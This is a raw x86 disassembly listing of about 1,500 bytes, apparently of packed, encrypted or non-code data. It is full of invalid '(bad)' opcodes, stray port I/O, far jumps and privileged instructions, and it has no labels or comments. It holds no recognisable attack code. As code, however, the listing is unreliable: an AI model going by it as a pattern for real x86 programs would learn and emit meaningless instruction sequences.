  417c9d:	mov    ch,BYTE PTR [ebp-0x1b18b8e9]
  417ca3:	pushf  
  417ca4:	mov    bl,0x8c
  417ca6:	cmp    DWORD PTR [edx+0x25],0xdb9c3dac
  417cad:	xchg   ebp,eax
  417cae:	add    ebp,0xbdc16266
  417cb4:	sub    edx,DWORD PTR [eax*2+0x26d7b894]
  417cbb:	(bad)
  417cbe:	push   eax
  417cbf:	dec    ebx
  417cc0:	push   edx
  417cc1:	enter  0x1f5d,0xad
  417cc5:	mov    WORD PTR [esi-0x3c0c6a83],cs
  417ccb:	addr16 arpl bp,di
  417cce:	xlat   BYTE PTR ds:[ebx]
  417ccf:	mov    eax,0xa474ff77
  417cd4:	(bad)  
  417cd5:	xchg   edx,eax
  417cd6:	(bad)  
  417cd7:	sbb    al,0x85
  417cd9:	sub    DWORD PTR [ecx+edi*4+0x7c],edx
  417cdd:	push   esp
  417cde:	sub    BYTE PTR [eax+0x5fdb944b],ah
  417ce4:	fwait
  417ce5:	and    ebx,edx
  417ce7:	pop    ecx
  417ce8:	out    0x7c,al
  417cea:	inc    ecx
  417ceb:	push   edi
  417cec:	test   eax,0xe6f9adc6
  417cf1:	fstp   QWORD PTR [edi]
  417cf3:	fs jmp 0xb95f:0x784d32bf
  417cfb:	in     al,dx
  417cfc:	xchg   DWORD PTR [ecx+0x47130d74],ebx
  417d02:	dec    edx
  417d03:	(bad)  [eax-0x8d2c7c8]
  417d09:	mov    dl,0x74
  417d0b:	mov    ah,0x40
  417d0d:	mov    esp,0xc6bf3644
  417d12:	dec    ebx
  417d13:	push   cs
  417d14:	retf   
  417d15:	pop    esp
  417d16:	sbb    eax,0x7379cb8a
  417d1b:	ins    DWORD PTR es:[edi],dx
  417d1c:	rol    DWORD PTR [edi],cl
  417d1e:	scas   al,BYTE PTR es:[edi]
  417d1f:	cmp    eax,0x5e1e25b4
  417d24:	mov    eax,0x76c6a5e
  417d29:	aam    0xfc
  417d2b:	and    al,0x55
  417d2d:	stos   BYTE PTR es:[edi],al
  417d2e:	std    
  417d2f:	(bad)  
  417d30:	shr    BYTE PTR [ebp+0x487fb2c9],1
  417d36:	dec    ecx
  417d37:	xchg   DWORD PTR [esi+0x4ae13441],edx
  417d3d:	call   0xd7ed:0xd4b3e980
  417d44:	hlt    
  417d45:	bound  edx,QWORD PTR [edi]
  417d47:	mov    edi,0xdfa01471
  417d4c:	(bad)  
  417d4d:	iret   
  417d4e:	ret    
  417d4f:	(bad)  
  417d50:	stos   DWORD PTR es:[edi],eax
  417d51:	or     eax,0x66ebd49d
  417d56:	mov    eax,ds:0x5f46f7a1
  417d5b:	pusha  
  417d5c:	clc    
  417d5d:	pop    ds
  417d5e:	xor    DWORD PTR [esi+edx*8+0x4e2e0df1],esp
  417d65:	leave  
  417d66:	adc    DWORD PTR [edx+0x2a1f7876],edx
  417d6c:	dec    esp
  417d6d:	and    al,0x75
  417d6f:	jne    0x417d62
  417d71:	test   BYTE PTR [eax+0x73c9ff19],al
  417d77:	mov    BYTE PTR [edi+edx*2-0x18e5bae],dh
  417d7e:	mov    ebx,0xc467ec09
  417d83:	or     BYTE PTR [ebx-0xd],0x48
  417d87:	push   eax
  417d88:	ins    DWORD PTR es:[edi],dx
  417d89:	sbb    bl,BYTE PTR [ecx]
  417d8b:	out    dx,al
  417d8c:	pop    ds
  417d8d:	sbb    cl,al
  417d8f:	not    ch
  417d91:	out    dx,al
  417d92:	cmp    al,BYTE PTR [esi-0x368d2ac8]
  417d98:	(bad)  
  417d99:	mov    bh,0xd3
  417d9b:	adc    BYTE PTR [edx*2-0x89076fb],dl
  417da2:	popf   
  417da3:	inc    esi
  417da4:	sub    al,0x6e
  417da6:	frstor [ebp-0x4bce9bc7]
  417dac:	push   esp
  417dad:	push   edx
  417dae:	pop    eax
  417daf:	cdq    
  417db0:	inc    ebx
  417db1:	ins    DWORD PTR es:[edi],dx
  417db2:	dec    esp
  417db3:	mov    ah,0xfb
  417db5:	xchg   ebx,eax
  417db6:	push   edi
  417db7:	out    0x22,eax
  417db9:	mov    ebp,0xa155fb71
  417dbe:	into   
  417dbf:	pop    DWORD PTR [ecx]
  417dc1:	cmp    al,0x17
  417dc3:	(bad)  
  417dc4:	lahf   
  417dc5:	rcr    DWORD PTR [esi-0x7d],0xad
  417dc9:	or     DWORD PTR [edi-0x80],ebp
  417dcc:	jmp    0x62b57dc
  417dd1:	clc    
  417dd2:	mov    ch,0xc
  417dd4:	pop    ss
  417dd5:	cmp    eax,0x469fb55d
  417dda:	dec    edi
  417ddb:	mov    DWORD PTR [ebx+edx*2],ebx
  417dde:	dec    ecx
  417ddf:	or     BYTE PTR [edi+0x48dc1997],ch
  417de5:	data16 outs dx,BYTE PTR ds:[esi]
  417de7:	push   ds
  417de8:	jp     0x417e3d
  417dea:	call   0x2acd:0x57dc000c
  417df1:	(bad)  
  417df2:	mov    es,WORD PTR es:[edx+0x25]
  417df6:	aam    0xd1
  417df8:	call   0x8d62:0x2a9220ca
  417dff:	ds jmp 0x417ddc
  417e02:	sbb    ch,bl
  417e04:	sti    
  417e05:	pop    edi
  417e06:	outs   dx,DWORD PTR ds:[esi]
  417e07:	cmp    DWORD PTR [eax-0x3c526325],ecx
  417e0d:	or     BYTE PTR [ebx],bh
  417e0f:	mov    ecx,0xdf487903
  417e14:	sbb    al,0xd0
  417e16:	sbb    BYTE PTR [eax+0x3cd4765e],cl
  417e1c:	jmp    FWORD PTR [eax]
  417e1e:	mov    esi,0xab6b7894
  417e23:	adc    BYTE PTR [esi-0x5a7fd8de],al
  417e29:	jecxz  0x417dea
  417e2b:	sub    DWORD PTR [ebx-0x76],ebx
  417e2e:	ja     0x417e58
  417e30:	mov    ebp,0xf01e93d6
  417e35:	int    0x6d
  417e37:	stc    
  417e38:	(bad)  
  417e39:	pop    eax
  417e3a:	mov    dl,0x2a
  417e3c:	xchg   DWORD PTR [ecx+0x55],esi
  417e3f:	jle    0x417e68
  417e41:	add    al,0x86
  417e43:	cmp    eax,0xd306d9b0
  417e48:	cmp    DWORD PTR [eax],ecx
  417e4a:	lock mov al,ds:0x4b004cd
  417e50:	push   eax
  417e51:	cwde   
  417e52:	push   ds
  417e53:	jg     0x417ebe
  417e55:	inc    ecx
  417e56:	xchg   edx,eax
  417e57:	shl    bl,1
  417e59:	in     al,dx
  417e5a:	shr    BYTE PTR [esi+0x2f9890b9],0x38
  417e61:	ret    
  417e62:	pop    ds
  417e63:	add    DWORD PTR [ecx],ebp
  417e65:	add    DWORD PTR [edi-0x33722099],edx
  417e6b:	(bad)  
  417e6c:	hlt    
  417e6d:	sbb    dl,BYTE PTR [ecx-0x22ea8743]
  417e73:	xor    DWORD PTR [ebp-0x76c94a49],ebp
  417e79:	cmp    al,dh
  417e7b:	jno    0x417e5b
  417e7d:	mov    esi,0x3a390658
  417e82:	dec    esi
  417e83:	aam    0x65
  417e85:	xor    edx,esp
  417e87:	aas    
  417e88:	mov    bh,0xd
  417e8a:	ss push ds
  417e8c:	fwait
  417e8d:	stos   DWORD PTR es:[edi],eax
  417e8e:	aam    0x83
  417e90:	or     eax,0xfaabe54e
  417e95:	add    eax,0xee04dfc2
  417e9a:	cmc    
  417e9b:	mov    ds:0x5c6ede4b,eax
  417ea0:	ins    DWORD PTR es:[edi],dx
  417ea1:	cld    
  417ea2:	imul   eax,esi,0x8afa6a7f
  417ea8:	push   ecx
  417ea9:	add    al,0xb9
  417eab:	sub    ebp,ebp
  417ead:	call   0x1e42ee83
  417eb2:	sub    eax,0xfa1d7440
  417eb7:	enter  0x3ae5,0x78
  417ebb:	cmp    DWORD PTR [ebx-0xe],esp
  417ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ebf:	xlat   BYTE PTR ds:[ebx]
  417ec0:	pop    edi
  417ec1:	das    
  417ec2:	rol    BYTE PTR [ebp+0x22],cl
  417ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ec6:	in     eax,0x66
  417ec8:	fcomp  QWORD PTR [esi+0xcf39411]
  417ece:	jnp    0x417e60
  417ed0:	mov    bl,0x9c
  417ed2:	rcl    esi,cl
  417ed4:	and    DWORD PTR [esi+edi*4],eax
  417ed7:	imul   esp,esp,0x691c2058
  417edd:	xor    ebp,DWORD PTR [ebx-0x4b982c4d]
  417ee3:	fisubr WORD PTR [esi]
  417ee5:	push   ebx
  417ee6:	scas   al,BYTE PTR es:[edi]
  417ee7:	xor    DWORD PTR [edi+0x4c514d3],0xeff0d695
  417ef1:	and    eax,0x801af36c
  417ef6:	dec    esi
  417ef7:	sbb    ebx,ebx
  417ef9:	(bad)  
  417efa:	(bad)  
  417efc:	cmp    BYTE PTR [eax+0x4b],ah
  417eff:	push   esi
  417f00:	xchg   ebp,eax
  417f01:	or     eax,0x4c3a64b5
  417f06:	jbe    0x417f68
  417f08:	shl    DWORD PTR es:[ebp+0x3b],0xcb
  417f0d:	loop   0x417eb2
  417f0f:	fcomp  DWORD PTR [edx+ebp*2]
  417f12:	pop    esi
  417f13:	sbb    BYTE PTR [ecx-0x636b37b],0x21
  417f1a:	add    al,0x92
  417f1c:	push   edi
  417f1d:	bound  esp,QWORD PTR [eax+0x65]
  417f20:	repz mov al,0xb1
  417f23:	jg     0x417f8c
  417f25:	push   0x5a14e2a9
  417f2a:	inc    eax
  417f2b:	mov    ds:0xa3eb75c7,eax
  417f30:	cmc    
  417f31:	loop   0x417f83
  417f33:	(bad)  
  417f34:	jnp    0x417eed
  417f36:	pop    eax
  417f37:	fiadd  DWORD PTR [ebx+0x61]
  417f3a:	in     eax,0x6c
  417f3c:	pop    ds
  417f3d:	add    edi,eax
  417f3f:	stos   BYTE PTR es:[edi],al
  417f40:	push   ebp
  417f41:	xor    al,0x8f
  417f43:	fsub   st,st(3)
  417f45:	mov    esi,0x12f6602b
  417f4a:	ficom  DWORD PTR [edi-0x3af837b]
  417f50:	fld    DWORD PTR [ecx+0x2d]
  417f53:	mov    BYTE PTR es:[ecx],ah
  417f56:	fcmovb st,st(1)
  417f58:	pop    ecx
  417f59:	sub    esp,DWORD PTR [eax+0x20296cf2]
  417f5f:	test   BYTE PTR [eax-0x77903f25],dh
  417f65:	adc    al,0xf9
  417f67:	jae    0x417f89
  417f69:	dec    ecx
  417f6a:	inc    edx
  417f6b:	mov    bh,0x64
  417f6d:	ins    BYTE PTR es:[edi],dx
  417f6e:	ret    0xcefa
  417f71:	sub    edi,DWORD PTR [edx+0x7b]
  417f74:	inc    edi
  417f75:	out    dx,al
  417f76:	jnp    0x417f16
  417f78:	repz adc DWORD PTR [ecx],eax
  417f7b:	lock sahf 
  417f7d:	or     eax,0xeb952981
  417f82:	aad    0x94
  417f84:	push   edx
  417f85:	add    esi,0xffffffb1
  417f88:	aaa    
  417f89:	adc    DWORD PTR [edx+0x479ddf33],eax
  417f8f:	pusha  
  417f90:	aad    0x92
  417f92:	lods   al,BYTE PTR ds:[esi]
  417f93:	jns    0x418009
  417f95:	jns    0x417f33
  417f97:	rcl    DWORD PTR [esp+0x3bf9d242],0x36
  417f9f:	retf   
  417fa0:	js     0x417f3e
  417fa2:	push   edx
  417fa3:	imul   ebx,eax,0x20
  417fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa7:	fwait
  417fa8:	sub    ah,cl
  417faa:	mov    WORD PTR [ebx],ds
  417fac:	pop    edx
  417fad:	leave  
  417fae:	test   eax,0x4cf7519c
  417fb3:	sub    BYTE PTR ds:0xeb4b792a,dl
  417fb9:	adc    dh,BYTE PTR [edx]
  417fbb:	adc    DWORD PTR [esi+0x30652b9b],esp
  417fc1:	jecxz  0x417f49
  417fc3:	mov    eax,ds:0xf9c2d116
  417fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc9:	sub    al,0x8e
  417fcb:	je     0x41802f
  417fcd:	aam    0xed
  417fcf:	mov    ss,WORD PTR [ebx+0x53a55332]
  417fd5:	out    0xee,al
  417fd7:	mov    al,0x3a
  417fd9:	js     0x417ff7
  417fdb:	sqrtps xmm7,XMMWORD PTR [edx]
  417fde:	sub    al,0xe9
  417fe0:	push   ebx
  417fe1:	jmp    0x9bc9:0xd661bb9c
  417fe8:	outs   dx,BYTE PTR ds:[esi]
  417fe9:	pop    edx
  417fea:	retf   
  417feb:	clc    
  417fec:	loope  0x418018
  417fee:	inc    edi
  417fef:	mov    bh,0x6c
  417ff1:	test   DWORD PTR [edi],edx
  417ff3:	mov    ebp,0xad304069
  417ff8:	sub    DWORD PTR [ebx],esi
  417ffa:	sub    bh,BYTE PTR [edx+0x42c3276e]
  418000:	sub    BYTE PTR ds:0xf130771a,dh
  418006:	ins    BYTE PTR es:[edi],dx
  418007:	mov    ch,0x6e
  418009:	dec    edx
  41800b:	push   ebp
  41800c:	push   ecx
  41800d:	adc    DWORD PTR [ebp-0xf],0x1b32dfb1
  418014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418016:	adc    eax,0x4e24ce9e
  41801b:	(bad)  
  41801c:	cmp    BYTE PTR [esi+0x3f32019],dl
  418022:	mov    BYTE PTR fs:[ecx+0xcd1af72],cl
  418029:	sbb    ebp,0x40fc4ef1
  41802f:	out    0x9b,al
  418031:	jbe    0x41804b
  418033:	popa   
  418034:	sub    esi,0x73
  418037:	jo     0x418046
  418039:	push   ebx
  41803a:	shl    DWORD PTR [ebp-0x27befa3c],cl
  418040:	nop
  418041:	ficomp DWORD PTR [edx]
  418043:	xlat   BYTE PTR ds:[ebx]
  418044:	adc    al,0x85
  418046:	fstp   TBYTE PTR [edi+0x7a5c8215]
  41804c:	dec    ecx
  41804d:	and    DWORD PTR [ecx+0x12],edi
  418050:	(bad)  
  418051:	pop    esi
  418052:	jns    0x417ff0
  418054:	sub    ch,BYTE PTR [eax-0x44]
  418057:	inc    ebp
  418058:	jae    0x418099
  41805a:	icebp  
  41805b:	inc    esi
  41805c:	xchg   BYTE PTR [edx+0x4b67d7d3],dl
  418062:	mov    ch,0x98
  418064:	stc    
  418065:	mov    ebp,0x4d5caa71
  41806a:	mov    BYTE PTR [ecx],ah
  41806c:	imul   edi,DWORD PTR [eax],0x80d5c8db
  418072:	inc    ecx
  418073:	loopne 0x418020
  418075:	sbb    ebx,ebp
  418077:	sbb    ecx,edi
  418079:	and    al,BYTE PTR [ebp+0x43152411]
  41807f:	cmc    
  418080:	iret   
  418081:	aad    0xdb
  418083:	inc    ebx
  418084:	inc    edi
  418085:	in     al,dx
  418086:	adc    DWORD PTR [eax+0x2f55d045],eax
  41808c:	fwait
  41808d:	jmp    DWORD PTR [ebp+0x64]
  418090:	fist   WORD PTR [ecx+0xd7bf8fa]
  418096:	(bad)  [ebp+0x69]
  418099:	dec    edi
  41809a:	fs popa 
  41809c:	mov    WORD PTR [edi],ds
  41809e:	cdq    
  41809f:	ret    0x571d
  4180a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a3:	inc    esi
  4180a4:	mov    ecx,0xf2a75fc6
  4180a9:	xchg   ecx,eax
  4180aa:	add    BYTE PTR [edi+0x32],al
  4180ad:	jne    0x4180a6
  4180af:	jb     0x4180f8
  4180b1:	loope  0x418065
  4180b3:	jecxz  0x418078
  4180b5:	div    BYTE PTR [ecx+0xa0f932e]
  4180bb:	fstp   QWORD PTR [ebx+edi*8+0x53835e4d]
  4180c2:	pop    ebx
  4180c3:	jns    0x418129
  4180c5:	in     al,0xb1
  4180c7:	retf   0xdc40
  4180ca:	xor    eax,0x778068e6
  4180cf:	shl    DWORD PTR [ebx],0x68
  4180d2:	or     DWORD PTR [ecx+ebx*2+0x0],edx
  4180d6:	mov    ah,0x6d
  4180d8:	retf   0xc1e2
  4180db:	xchg   esi,eax
  4180dc:	loopne 0x41812e
  4180de:	sbb    dl,bh
  4180e0:	(bad)  
  4180e2:	(bad)  
  4180e3:	cmp    esp,0x37391d4
  4180e9:	pop    esp
  4180ea:	sbb    BYTE PTR [ebx],dh
  4180ec:	inc    edi
  4180ed:	mov    bh,0x55
  4180ef:	xor    ebp,DWORD PTR [edi]
  4180f1:	mov    al,0xd3
  4180f3:	aad    0x9f
  4180f5:	push   es
  4180f6:	pop    es
  4180f7:	sahf   
  4180f8:	(bad)  
  4180f9:	adc    eax,0xe71dffde
  4180fe:	es xchg esi,eax
  418100:	jecxz  0x418114
  418102:	cdq    
  418103:	lds    ebp,FWORD PTR [esi-0x9]
  418106:	fmul   st(0),st
  418108:	cli    
  418109:	and    bh,BYTE PTR [esi-0x28]
  41810c:	fld    QWORD PTR [ecx-0x328b49d0]
  418112:	push   ds
  418113:	aad    0x2d
  418115:	push   esp
  418116:	mov    WORD PTR [ecx],?
  418118:	xor    DWORD PTR [edx-0x1d],esp
  41811b:	mul    BYTE PTR [ebx-0x5a3a0375]
  418121:	mov    ds:0x4a2ed892,eax
  418126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418127:	sub    eax,DWORD PTR [ebx+edx*2-0xb5faaf8]
  41812e:	aad    0xdb
  418130:	int    0x11
  418132:	retf   0x3957
  418135:	pop    es
  418136:	(bad)  
  418137:	xor    al,0xa4
  418139:	fst    DWORD PTR [eax+0x731a5cb1]
  41813f:	in     eax,0xed
  418141:	push   esp
  418142:	shr    DWORD PTR [edi+0x65],cl
  418145:	mov    dh,0x6d
  418147:	popf   
  418148:	xor    al,0xc7
  41814a:	add    BYTE PTR [ebp-0x42],0x98
  41814e:	rol    BYTE PTR [ebx-0x1d],1
  418151:	jmp    0x41815b
  418153:	mov    eax,0x34e92c19
  418158:	xchg   esp,eax
  418159:	scas   eax,DWORD PTR es:[edi]
  41815a:	out    0x67,al
  41815c:	sbb    eax,DWORD PTR [ebx+0x7]
  41815f:	dec    edi
  418160:	jae    0x418173
  418162:	cmp    DWORD PTR [edi],esp
  418164:	inc    ebx
  418165:	jge    0x4180f0
  418167:	sbb    DWORD PTR [edi-0x5580ad1a],ebx
  41816d:	push   ecx
  41816e:	sahf   
  41816f:	pop    eax
  418170:	sbb    esp,ebp
  418172:	pusha  
  418173:	or     BYTE PTR [esi+0x28],bh
  418176:	cmp    bl,BYTE PTR [edi]
  418178:	test   DWORD PTR [edi-0x2e0068a9],edi
  41817e:	add    eax,0xc18f5171
  418183:	sub    BYTE PTR [ecx],0xf6
  418186:	fdiv   DWORD PTR [esi-0x6c]
  418189:	aaa    
  41818a:	cmp    BYTE PTR [ebx-0x73688523],bl
  418190:	shl    BYTE PTR [ebx+0x6552fc88],cl
  418196:	adc    dl,ah
  418198:	mov    eax,ds:0xc7a90e17
  41819d:	pop    esp
  41819e:	sub    ebp,eax
  4181a0:	add    ecx,DWORD PTR [edi-0xd]
  4181a3:	add    dl,dl
  4181a5:	adc    ecx,esp
  4181a7:	arpl   di,bx
  4181a9:	push   es
  4181aa:	push   ebx
  4181ab:	xchg   ebx,eax
  4181ac:	sbb    BYTE PTR [edx],ah
  4181ae:	add    al,0xec
  4181b0:	pusha  
  4181b1:	js     0x4181c2
  4181b3:	rcr    DWORD PTR [ecx],0x32
  4181b6:	xchg   ecx,eax
  4181b7:	cmp    eax,DWORD PTR ds:0xf72cf682
  4181bd:	test   ch,bl
  4181bf:	add    ah,bh
  4181c1:	adc    ebx,DWORD PTR [edi-0x142764bb]
  4181c7:	mov    ebx,0xd4c3f7b7
  4181cc:	mov    eax,0x73b8e80e
  4181d1:	addr16 aas 
  4181d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181d4:	and    cl,BYTE PTR [ecx]
  4181d6:	shl    DWORD PTR [esi+0x3f],0xcd
  4181da:	jle    0x4181b1
  4181dc:	mov    ebp,0xe7e14d4d
  4181e1:	push   0x9b91529c
  4181e6:	popf   
  4181e7:	mov    esi,DWORD PTR [ebp-0x62]
  4181ea:	nop
  4181eb:	outs   dx,BYTE PTR ds:[esi]
  4181ec:	adc    ebp,edi
  4181ee:	and    eax,0x28e2a30f
  4181f3:	pop    ecx
  4181f4:	repz sub eax,0x9cb7ed33
  4181fa:	in     al,0x5e
  4181fc:	inc    esi
  4181fd:	out    dx,eax
  4181fe:	inc    ebp
  4181ff:	arpl   WORD PTR [esi],bp
  418201:	mov    esi,0x8e757866
  418206:	xor    eax,0x2c79c19d
  41820b:	loope  0x4181b7
  41820d:	xor    DWORD PTR [ebx-0x89472ff],esi
  418213:	xchg   ebp,eax
  418214:	dec    edi
  418215:	imul   ecx,DWORD PTR [edi+ebp*2],0xd547335f
  41821c:	das    
  41821d:	fist   WORD PTR [ebx-0x5f]
  418220:	fldcw  WORD PTR ds:0xf1386582
  418226:	retf   
  418227:	rcl    BYTE PTR [ecx-0x59b4f588],0x66
  41822e:	inc    ecx
  41822f:	xor    DWORD PTR [esi],0x54
  418232:	add    eax,0x712719d0
  418237:	xchg   DWORD PTR [esi],ebx
  418239:	inc    ebx
  41823a:	add    BYTE PTR [eax],cl
  41823c:	fsub   DWORD PTR [ebx+0x349a75a0]
  418242:	xchg   esp,eax
  418243:	xchg   esp,eax
  418244:	popa   
  418245:	add    al,0xdb
  418247:	jne    0x418211
  418249:	add    al,0x8f
  41824b:	or     BYTE PTR [ecx-0x54],ch
  41824e:	add    esp,0xffffffbb
  418251:	fld    DWORD PTR ds:0x33f68c41
  418257:	pop    ebx
  418258:	and    al,0x4b
  41825a:	jl     0x418213
  41825c:	cmc    
  41825d:	cwde   
  41825e:	and    al,0x96
  418260:	mov    ch,0x96
  418262:	sbb    dl,BYTE PTR [edi]
  418264:	push   edx
  418265:	popf   
  418266:	ret    
  418267:	stos   DWORD PTR es:[edi],eax
  418268:	retf   
  418269:	ficom  WORD PTR [ebx-0x6ea8733e]
  41826f:	dec    eax
  418270:	test   eax,0x3ececa43
  418275:	dec    eax
  418276:	dec    ebp
  418277:	dec    ecx
  418278:	cld    
  418279:	inc    edi
  41827a:	dec    ebx
  41827b:	push   cs
  41827c:	scas   al,BYTE PTR es:[edi]
  41827d:	bound  ebp,QWORD PTR [ecx+0x21f9527c]
  418283:	jge    0x418237
  418285:	and    al,0x77
  418287:	jb     0x4182cc
  418289:	sub    al,0xe9
  41828b:	imul   esi,esi,0xffffffd6
  41828e:	xlat   BYTE PTR ds:[ebx]
  41828f:	(bad)  
  418291:	stc    
  418292:	rcr    ebx,1
  418294:	pop    edi
  418295:	dec    edx
  418296:	(bad)  
  418297:	je     0x4182e6
  418299:	add    al,0x9
  41829b:	xor    edi,DWORD PTR [eiz*8-0x19959688]
  4182a2:	sub    BYTE PTR [ebx-0x69],0xbe
  4182a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a7:	test   eax,0x1d198f5a
  4182ac:	sahf   
  4182ad:	ins    BYTE PTR es:[edi],dx
  4182ae:	add    eax,0xeba2e5cf
  4182b3:	scas   eax,DWORD PTR es:[edi]
  4182b4:	sbb    ebx,edx
  4182b6:	ficom  DWORD PTR [ebx]
  4182b8:	jge    0x41830b
  4182ba:	test   al,0x80
  4182bc:	and    eax,0x175b5941
  4182c1:	idiv   BYTE PTR [edx]
  4182c3:	gs push 0xd8160f6b
  4182c9:	fnstsw WORD PTR [ebx-0x73]
  4182cc:	stos   DWORD PTR es:[edi],eax
  4182cd:	and    BYTE PTR [ebp+0x4177ac0],dh
  4182d3:	or     al,0x23
  4182d5:	jge    0x4182b8
  4182d7:	xor    eax,0xd1c026bb
  4182dc:	xor    DWORD PTR [edx-0x3297212b],edx
  4182e2:	mov    ah,0x2d
  4182e4:	mov    esi,0x22c098a9
  4182e9:	jl     0x418360
  4182eb:	jl     0x4182a2
  4182ed:	or     ecx,esp
  4182ef:	sub    al,BYTE PTR [esi-0x2313d164]
  4182f5:	scas   eax,DWORD PTR es:[edi]
  4182f6:	imul   edx,DWORD PTR ds:0x2db24826,0x69
  4182fd:	sub    eax,0x9fcca2bb
  418302:	lock cdq 
  418304:	aas    
  418305:	pushf  
  418306:	or     DWORD PTR [esi+0x1f],esi
  418309:	mov    esp,0x41d45127
  41830e:	mov    esp,0x5cd1d0f5
  418313:	retf   
  418314:	in     al,dx
  418315:	jle    0x41832f
  418317:	inc    edi
  418318:	ret    0x259a
  41831b:	or     al,0x9a
  41831d:	popf   
  41831e:	xchg   ebx,eax
  41831f:	cli    
  418320:	sar    DWORD PTR [ebx],1
  418322:	and    BYTE PTR [eax],ch
  418324:	push   ss
  418325:	sbb    DWORD PTR [eax-0x6f],esp
  418328:	adc    dl,BYTE PTR [ebp+0x32093e68]
  41832e:	xchg   ecx,eax
  41832f:	jmp    0xd38c3766
  418334:	cli    
  418335:	push   eax
  418336:	xchg   ebp,eax
  418337:	outs   dx,BYTE PTR ds:[esi]
  418338:	ss ja  0x41838c
  41833b:	sbb    al,0x77
  41833d:	adc    BYTE PTR [ebp-0x55f96144],0xa4
  418344:	and    DWORD PTR [ebx-0xdd5041f],0x9c961f58
  41834e:	mov    WORD PTR [ecx],ds
  418350:	clc    
  418351:	cmp    BYTE PTR [ecx],ch
  418353:	aaa    
  418354:	xchg   BYTE PTR [ecx+0x7daf09ea],bh
  41835a:	mov    al,0x35
  41835c:	mov    ds:0xe0e2100,eax
  418361:	dec    eax
  418362:	outs   dx,DWORD PTR ds:[esi]
  418363:	ins    DWORD PTR es:[edi],dx
  418364:	(bad)
  418368:	sub    eax,0xd113af0a
  41836d:	leave  
  41836e:	cmp    al,BYTE PTR [edi]
  418370:	ins    DWORD PTR es:[edi],dx
  418371:	mov    dl,BYTE PTR [ecx+0x6e09d7e9]
  418377:	sar    DWORD PTR [ebx],1
  418379:	jmp    0x1d85f807
  41837e:	dec    eax
  41837f:	xchg   BYTE PTR [ecx],bh
  418381:	fst    st(4)
  418383:	test   eax,0x2410c36b
  418388:	add    esi,esp
  41838a:	(bad)  
  41838b:	push   0xaa8f3f20
  418390:	cmp    DWORD PTR [esi],ecx
  418392:	mov    dh,0x4f
  418394:	inc    edx
  418395:	fild   QWORD PTR [ebx-0x1e27c127]
  41839b:	push   edx
  41839c:	enter  0xcf90,0xc8
  4183a0:	aad    0x3f
  4183a2:	cmp    al,0x7f
  4183a4:	shl    DWORD PTR [ebp+0x8e34c1f],1
  4183aa:	pushf  
  4183ab:	sbb    eax,ebp
  4183ad:	pop    esp
  4183ae:	sub    BYTE PTR [edi-0x5fcdd4fb],ah
  4183b4:	aaa    
  4183b5:	add    eax,DWORD PTR [eax-0x54e71ae8]
  4183bb:	dec    esp
  4183bc:	dec    esp
  4183bd:	in     eax,0x0
  4183bf:	inc    edx
  4183c0:	scas   al,BYTE PTR es:[edi]
  4183c1:	jne    0x41839a
  4183c3:	in     eax,dx
  4183c4:	cld    
  4183c5:	call   0x69bd6385
  4183ca:	stos   BYTE PTR es:[edi],al
  4183cb:	pop    ecx
  4183cc:	out    0xbd,al
  4183ce:	xlat   BYTE PTR ds:[ebx]
  4183cf:	repnz aam 0x3a
  4183d2:	mov    dh,0xa8
  4183d4:	ins    BYTE PTR es:[edi],dx
  4183d5:	mov    dh,0x75
  4183d7:	jns    0x4183a4
  4183d9:	gs popa 
  4183db:	jns    0x41839b
  4183dd:	leave  
  4183de:	fsubr  st,st(0)
  4183e0:	loop   0x4183f9
  4183e2:	mov    edx,0xb030104
  4183e7:	add    al,0xf7
  4183e9:	mov    esi,DWORD PTR [edx+edi*4-0x63]
  4183ed:	loope  0x418410
  4183ef:	sub    BYTE PTR [ebx-0x28acf456],bl
  4183f5:	pop    es
  4183f6:	xchg   ebp,eax
  4183f7:	or     ecx,DWORD PTR [edi]
  4183f9:	jecxz  0x41846f
  4183fb:	add    BYTE PTR [edi],ch
  4183fd:	aas    
  4183fe:	mov    cl,0xec
  418400:	sub    ah,BYTE PTR [ebp+0x2d16a50c]
  418406:	adc    BYTE PTR [edx-0x51],dh
  418409:	mov    eax,ds:0x82e37396
  41840e:	imul   eax,DWORD PTR [ebx+0x6747a943],0x64
  418415:	pop    ds
  418416:	je     0x4183a9
  418418:	dec    edx
  418419:	or     esp,ebp
  41841b:	(bad)  
  41841c:	adc    eax,ecx
  41841e:	inc    edi
  41841f:	fild   WORD PTR [ecx]
  418421:	jnp    0x41848d
  418423:	test   BYTE PTR ss:[edi-0x63],cl
  418427:	or     DWORD PTR [edx],0x373476f6
  41842d:	sahf   
  41842e:	lea    ecx,[esp+edx*2]
  418431:	mov    edx,?
  418433:	repz fwait
  418435:	inc    eax
  418436:	mov    ecx,DWORD PTR ds:0xd0f7e441
  41843c:	mov    eax,0x81e00124
  418441:	add    ch,BYTE PTR [eax]
  418443:	adc    al,0x85
  418445:	test   eax,0x22881c7d
  41844a:	sub    cl,ah
  41844c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844e:	outs   dx,BYTE PTR ds:[esi]
  41844f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418450:	pop    eax
  418451:	(bad)  
  418452:	fdiv   st,st(1)
  418454:	cli    
  418455:	loope  0x4183da
  418457:	jnp    0x4183ed
  418459:	iret   
  41845a:	lea    esp,[eax+edx*8]
  41845d:	les    esp,FWORD PTR [ebx-0x113053ab]
  418463:	xlat   BYTE PTR ds:[ebx]
  418464:	dec    ecx
  418465:	outs   dx,BYTE PTR ds:[esi]
  418466:	dec    esi
  418467:	add    DWORD PTR [ebx+0x517a6df4],0xcd568fca
  418471:	and    DWORD PTR [esi-0x59946bc1],eax
  418477:	sti    
  418478:	(bad)  
  418479:	retf   0xa561
  41847c:	retf   0x2231
  41847f:	mov    esp,0xb6a2467e
  418484:	mov    ecx,DWORD PTR [ecx-0x614732e8]
  41848a:	or     BYTE PTR [edi+eiz*1+0x466119f5],cl
  418491:	dec    ecx
  418492:	retf   
  418493:	inc    ebp
